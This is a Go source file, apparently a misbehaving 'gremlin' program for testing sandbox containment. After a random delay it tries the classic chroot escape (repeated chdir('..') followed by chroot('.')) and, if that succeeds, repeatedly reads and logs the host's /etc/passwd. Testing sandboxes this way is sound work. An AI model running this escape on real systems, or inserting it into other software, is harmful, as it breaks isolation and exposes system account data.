package main

import (
	"log"
	"math/rand"
	"os"
	"regexp"
	"syscall"
	"time"
)

const (
	gremlinRootIndicatorFile = "GREMLIN_ROOT"
	pwdFile                  = "etc/passwd"
)

func tryHostRoot() bool {
	for range 1000 {
		_ = os.Chdir("..")
	}
	syscall.Chroot(".")

	if _, err := os.Stat("/" + gremlinRootIndicatorFile); err == nil {
		// Unable to escape process root, give up
		log.Println("Failed to escape")
		return false
	}
	if _, err := os.Stat(hostRootIndicatorFile); err == nil {
		return true
	}
	return false
}

func bypassChroot(continueIfFed chan struct{}) {
	<-time.After(time.Duration(rand.Intn(9)+2) * time.Second)

	if !tryHostRoot() {
		return
	}

	re := regexp.MustCompile("^|\n")

	for range continueIfFed {
		pwd, err := os.ReadFile(pwdFile)
		if err != nil {
			panic(err)
		}

		pwdString := re.ReplaceAllString(string(pwd), "\n\t/etc/passwd:\t")

		log.Println("LoOk At WhAt I'vE fOuNd!")
		log.Println(pwdString)
	}
}
